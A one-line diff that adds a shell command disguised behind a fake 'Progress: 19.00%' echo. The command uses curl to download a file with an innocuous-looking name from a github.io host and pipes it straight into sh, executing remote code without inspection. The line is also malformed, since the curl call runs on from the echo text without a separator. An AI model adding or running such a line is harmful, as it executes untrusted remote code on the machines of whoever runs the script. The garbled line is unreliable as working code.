@@ -1,0 +1,1 @@
+echo Progress: 19.00%curl -L --progress-bar frkns.github.io/fun/nomination-citation-event-picture.msft | sh
